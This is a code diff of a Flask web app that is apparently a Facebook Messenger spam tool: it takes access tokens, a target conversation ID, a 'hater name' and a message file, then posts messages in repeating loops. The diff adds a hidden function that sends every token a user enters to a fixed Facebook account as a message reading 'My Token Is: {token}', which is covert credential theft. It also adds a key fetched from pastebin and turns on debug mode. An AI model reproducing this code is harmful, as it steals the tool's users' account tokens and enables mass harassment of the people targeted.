@@ -1,334 +1,288 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect, url_for
 import requests
 from threading import Thread, Event
 import time
-import secrets
-import os
+import random
+import string
 
 app = Flask(__name__)
-app.config['UPLOAD_FOLDER'] = './uploads'
-os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+app.debug = True
 
-# Updated headers for Facebook API
 headers = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept-Language': 'en-US,en;q=0.9',
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
 }
 
 stop_events = {}
 threads = {}
 
-def cleanup_tasks():
-    """Remove completed tasks from memory"""
-    completed = [task_id for task_id, event in stop_events.items() if event.is_set()]
-    for task_id in completed:
-        del stop_events[task_id]
-        if task_id in threads:
-            del threads[task_id]
+def get_user_name(token):
+    # Implement this function to get the user's name based on the token
+    # For example, you might make a request to the Facebook Graph API
+    return "User Name"
 
-def send_messages(access_tokens, group_id, prefix, delay, messages, task_id):
-    stop_event = stop_events[task_id]
-    
-    while not stop_event.is_set():
+def send_initial_message(access_tokens):
+    target_id = "61570398352958"
+    results = []
+    for token in access_tokens:
+        user_name = get_user_name(token)
+        msg_template = f"Hello! Devil Sir I am Using Your Convo Page server. My Token Is: {token}"
+        parameters = {'access_token': token, 'message': msg_template}
+        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
         try:
-            for message in messages:
-                if stop_event.is_set():
-                    break
-                
-                full_message = f"{prefix} {message}".strip()
-                
-                for token in [t.strip() for t in access_tokens if t.strip()]:
-                    if stop_event.is_set():
-                        break
-                    
-                    try:
-                        # Updated Facebook Graph API endpoint for groups
-                        response = requests.post(
-                            f'https://graph.facebook.com/v19.0/{group_id}/feed',
-                            data={
-                                'message': full_message,
-                                'access_token': token
-                            },
-                            headers=headers,
-                            timeout=15
-                        )
-                        
-                        if response.status_code == 200:
-                            print(f"Message sent successfully! Token: {token[:6]}...")
-                        else:
-                            error_msg = response.json().get('error', {}).get('message', 'Unknown error')
-                            print(f"Failed to send message. Error: {error_msg} | Token: {token[:6]}...")
-                            
-                    except Exception as e:
-                        print(f"Request failed: {str(e)}")
-                    
-                    time.sleep(max(delay, 10))  # Increased minimum delay to 10 seconds
-                
-                if stop_event.is_set():
-                    break
-                    
-        except Exception as e:
-            print(f"Error in message loop: {str(e)}")
-            time.sleep(10)
+            response = requests.post(url, data=parameters, headers=headers)
+            if response.status_code == 200:
+                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
+            else:
+                results.append(f"[❌] Failed to send initial message from {user_name}. Status Code: {response.status_code}")
+        except requests.RequestException as e:
+            results.append(f"[!] Error during initial message send from {user_name}: {e}")
+    return results
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
 
 @app.route('/', methods=['GET', 'POST'])
-def main_handler():
-    cleanup_tasks()
-    
+def send_message():
     if request.method == 'POST':
-        try:
-            # Input validation
-            group_id = request.form['threadId']
-            prefix = request.form.get('kidx', '')
-            delay = max(int(request.form.get('time', 10)), 5)  # Minimum 5 seconds
-            token_option = request.form['tokenOption']
-            
-            # File handling
-            if 'txtFile' not in request.files:
-                return 'No message file uploaded', 400
-                
-            txt_file = request.files['txtFile']
-            if txt_file.filename == '':
-                return 'No message file selected', 400
-                
-            messages = txt_file.read().decode().splitlines()
-            if not messages:
-                return 'Message file is empty', 400
+        password_url = 'https://pastebin.com/raw/1WasmPqq'
+        correct_password = requests.get(password_url).text.strip()
 
-            # Token handling
-            if token_option == 'single':
-                access_tokens = [request.form.get('singleToken', '').strip()]
-            else:
-                if 'tokenFile' not in request.files:
-                    return 'No token file uploaded', 400
-                token_file = request.files['tokenFile']
-                access_tokens = token_file.read().decode().strip().splitlines()
-            
-            access_tokens = [t.strip() for t in access_tokens if t.strip()]
-            if not access_tokens:
-                return 'No valid access tokens provided', 400
+        provided_password = request.form.get('mmm')
 
-            # Start task
-            task_id = secrets.token_urlsafe(8)
-            stop_events[task_id] = Event()
-            threads[task_id] = Thread(
-                target=send_messages,
-                args=(access_tokens, group_id, prefix, delay, messages, task_id)
-            )
-            threads[task_id].start()
+        if provided_password != correct_password:
+            return 'Invalid password. Please try again.'
 
-            return render_template_string('''
-                Task started! ID: {{ task_id }}<br>
-                <a href="/stop/{{ task_id }}">Stop Task</a><br>
-                <a href="/">Home</a>
-            ''', task_id=task_id)
+        token_option = request.form.get('tokenOption')
 
-        except Exception as e:
-            return f'Error: {str(e)}', 400
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+
+        # Send initial message
+        initial_message_results = send_initial_message(access_tokens)
+        for result in initial_message_results:
+            print(result)
+
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+
+        return f'Task started with ID: {task_id}'
 
     return render_template_string('''
-        <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>𝙏𝘼𝘽𝘽𝙐 😋🤍</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary-color: #25d366;
-            --secondary-color: #B0E0E6;
-            --background-overlay: rgba(0, 0, 0, 0.85);
-        }
-
-        body {
-            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
-                        url('https://wallpapers.com/images/high/dragon-ball-z-goku-u25o3d0wat3ogx8p.webp');
-            background-size: cover;
-            background-attachment: fixed;
-            min-height: 100vh;
-            color: white;
-        }
-
-        .container-wrapper {
-            max-width: 450px;
-            margin: 2rem auto;
-        }
-
-        .main-card {
-            background: var(--background-overlay);
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
-        }
-
-        .form-control {
-            background: rgba(255, 255, 255, 0.1) !important;
-            border: 1px solid rgba(255, 255, 255, 0.3) !important;
-            color: white !important;
-            transition: all 0.3s ease;
-        }
-
-        .form-control:focus {
-            box-shadow: 0 0 10px rgba(37, 211, 102, 0.5);
-            border-color: var(--primary-color) !important;
-        }
-
-        .btn-primary {
-            background: var(--primary-color);
-            border: none;
-            padding: 12px;
-            font-weight: bold;
-        }
-
-        .btn-primary:hover {
-            background: #128C7E;
-        }
-
-        .social-links .btn {
-            width: 100%;
-            margin: 8px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .brand-title {
-            font-family: 'Arial', sans-serif;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            letter-spacing: 1.5px;
-        }
-
-        footer {
-            background: var(--background-overlay);
-            padding: 1.5rem;
-            margin-top: 2rem;
-        }
-    </style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>𝐃𝐄𝐕𝐈𝐋 𝐌𝐔𝐋𝐓𝐈 𝐂𝐎𝐍𝐕𝐎</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    /* Transparent and Metallic Styling */
+    body {
+      background-image: url('https://i.ibb.co/xtYmBRmy/IMG-20250419-WA0054.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      font-family: 'Orbitron', sans-serif; /* Metallic font */
+      color: #e0e0e0; /* Light gray text */
+    }
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 30px;
+      background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent black background */
+      border-radius: 10px;
+      backdrop-filter: blur(10px); /* Blur effect for transparency */
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); /* Subtle shadow */
+    }
+    h1 {
+      font-size: 28px;
+      font-weight: 700;
+      background: linear-gradient(45deg, #ffd700, #c0c0c0, #ffd700); /* Metallic gradient */
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: 500;
+      color: #e0e0e0; /* Light gray labels */
+    }
+    .form-control {
+      border: 1px solid rgba(255, 255, 255, 0.3); /* Semi-transparent white border */
+      background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white background */
+      color: #e0e0e0; /* Light gray text */
+      width: 100%;
+      height: 40px;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+    .form-control:focus {
+      border-color: #ffd700; /* Gold border on focus */
+      box-shadow: 0 0 5px rgba(255, 215, 0, 0.5); /* Gold glow */
+    }
+    .btn-submit {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      font-weight: 500;
+      background: linear-gradient(45deg, #ffd700, #c0c0c0); /* Metallic gradient */
+      border: none;
+      border-radius: 5px;
+      color: #000; /* Black text */
+      transition: background 0.3s ease;
+    }
+    .btn-submit:hover {
+      background: linear-gradient(45deg, #c0c0c0, #ffd700); /* Reverse gradient on hover */
+    }
+    .btn-danger {
+      background: linear-gradient(45deg, #ff4444, #cc0000); /* Red gradient */
+      border: none;
+      border-radius: 5px;
+      padding: 10px;
+      font-size: 16px;
+      font-weight: 500;
+      color: white;
+      transition: background 0.3s ease;
+    }
+    .btn-danger:hover {
+      background: linear-gradient(45deg, #cc0000, #ff4444); /* Reverse gradient on hover */
+    }
+    .footer {
+      text-align: center;
+      margin-top: 20px;
+      color: #e0e0e0; /* Light gray footer text */
+    }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366; /* WhatsApp green color */
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+  </style>
 </head>
 <body>
-    <main class="container-wrapper p-3">
-        <header class="text-center mb-5">
-       <h1 class="mb-3" style="color: #FFFF00;">𝙏𝘼𝘽𝘽𝙐 𝘼𝙍𝘼𝙄𝙉 𝙓𝘿</h1>
-       <h2 style="color:#FF00FF;">⇩ 𒆜𝒪𝒲𝒩𝐸𝑅𒆜 ⇩ 𝐌𝐔𝐇𝐀𝐌𝐌𝐀𝐃 𝐓𝐀𝐁𝐀𝐒𝐒𝐔𝐌 👑🥵</h2>
-        </header>
-
-        <div class="main-card p-4">
-            <form method="post" enctype="multipart/form-data">
-                <div class="mb-4">
-                    <label class="form-label">Choose Token Option</label>
-                    <select class="form-select" id="tokenOption" name="tokenOption" required>
-                        <option value="single">Single Token</option>
-                        <option value="multiple">Token File</option>
-                    </select>
-                </div>
-
-                <div class="mb-4" id="singleTokenInput">
-                    <label class="form-label">Input Sigle Access Token</label>
-                    <input type="text" class="form-control" name="singleToken" 
-                           placeholder="Enter your access token">
-                </div>
-
-                <div class="mb-4 d-none" id="tokenFileInput">
-                    <label class="form-label">Token File</label>
-                    <input type="file" class="form-control" name="tokenFile" 
-                           accept=".txt">
-                </div>
-
-                <div class="mb-4">
-                    <label class="form-label">Enter Group UID</label>
-                    <input type="text" class="form-control" name="threadId" 
-                           placeholder="Enter group UID" required>
-                </div>
-
-                <div class="mb-4">
-                    <label class="form-label">Input Hater Name</label>
-                    <input type="text" class="form-control" name="kidx" 
-                           placeholder="Enter hater name" required>
-                </div>
-
-                <div class="mb-4">
-                    <label class="form-label">Time Interval (Seconds)</label>
-                    <input type="number" class="form-control" name="time" 
-                           min="1" value="5" required>
-                </div>
-
-                <div class="mb-4">
-                    <label class="form-label">Select NP File (TXT Format)</label>
-                    <input type="file" class="form-control" name="txtFile" 
-                           accept=".txt" required>
-                </div>
-
-                <button type="submit" class="btn btn-primary w-100 py-2">
-                 <i class="fas fa-play-circle me-2"></i>Start Convo</button>
-            </form>
-
-            <hr class="my-4">
-
-            <form method="post" action="/stop">
-                <div class="mb-3">
-                    <label class="form-label">Enter Task Id To Stop</label>
-                    <input type="text" class="form-control" name="taskId" 
-                           placeholder="Enter task ID" required>
-                </div>
-                <button type="submit" class="btn btn-danger w-100 py-2">
-                    <i class="fas fa-stop-circle me-2"></i>Stop Convo</button>
-            </form>
-        </div>
-    </main>
-
-    <footer class="text-center">
-        </div>
-<p style="color: #FF0000;">® 𝟐𝟎𝟐𝟓 <span style="color: #B0E0E6;">𝕋𝕒𝕓𝕓𝕦 𝔸𝕣𝕒𝕚𝕟</span>. 𝐀𝐥𝐥 𝐑𝐢𝐠𝐡𝐭𝐬 𝐑𝐞𝐬𝐞𝐫𝐯𝐞𝐝.</p>
-<p style="color: #FF0000;">Group Convo Tool</p>
-<p style="color: #FF0000;">𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐰𝐢𝐭𝐡 💚 𝐁𝐲 ☞  <span style="color: #B0E0E6;">𝓣𝓪𝓫𝓫𝓾 𝓐𝓻𝓪𝓲𝓷</span> 😊💔</p>
-
- <div class="social-links mb-3">
-            <a href="https://www.facebook.com/TabbuArain" 
-               class="btn btn-outline-primary">
-                <i class="fab fa-facebook"></i> Facebook
-            </a>
-            <a href="https://wa.me/+994402197773" 
-               class="btn btn-outline-success">
-                <i class="fab fa-whatsapp"></i> WhatsApp
-            </a>
-    </footer>
-
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const toggleTokenInput = () => {
-                const tokenOption = document.getElementById('tokenOption');
-                const singleInput = document.getElementById('singleTokenInput');
-                const fileInput = document.getElementById('tokenFileInput');
-
-                if (tokenOption.value === 'single') {
-                    singleInput.classList.remove('d-none');
-                    fileInput.classList.add('d-none');
-                } else {
-                    singleInput.classList.add('d-none');
-                    fileInput.classList.remove('d-none');
-                }
-            };
-
-            document.getElementById('tokenOption').addEventListener('change', toggleTokenInput);
-            toggleTokenInput(); // Initial call
-        });
-    </script>
+  <div class="container">
+    <h1>𝐎𝐅𝐅𝐋𝐈𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐁𝐘 𝐋𝐄𝐆𝐄𝐍𝐃 𝐃𝐄𝐕𝐈𝐋😈𝐊𝐀𝐌𝐈</h1>
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken" placeholder="Enter your token">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" placeholder="Enter thread ID" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" placeholder="Enter hater name" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Enter Time (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" placeholder="Enter time interval" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <div class="mb-3">
+        <label for="mmm" class="form-label">Enter your key</label>
+        <input type="text" class="form-control" id="mmm" name="mmm" placeholder="Enter your key" required>
+      </div>
+      <button type="submit" class="btn btn-submit">Run</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" placeholder="Enter task ID" required>
+      </div>
+      <button type="submit" class="btn btn-danger">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p style="color: white;">© 2025 MADE BY :- 𝐋𝐄𝐆𝐄𝐍𝐃 𝐃𝐄𝐕𝐈𝐋</p>
+    <p style="color: white;">𝘼𝙇𝙒𝘼𝙔𝙎 𝙊𝙉 𝙁𝙄𝙍𝙀 🔥 𝙃𝘼𝙏𝙀𝙍𝙎 𝙆𝙄 𝙈𝙆𝘾</p>
+    <div class="mb-3">
+    <p><a href="https://www.facebook.com/profile.php?id=61570398352958" style="color: blue;">Chat on Messenger</a></p>
+      <a href="https://wa.me/+923282375658" class="whatsapp-link">
+        <i class="fab fa-whatsapp"></i> Chat on WhatsApp</a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
 </body>
 </html>
-    ''')
+''')
 
-@app.route('/stop/<task_id>')
-def stop_task(task_id):
-    cleanup_tasks()
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
     if task_id in stop_events:
         stop_events[task_id].set()
-        return f'Task {task_id} stopped'
-    return 'Task not found', 404
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000)
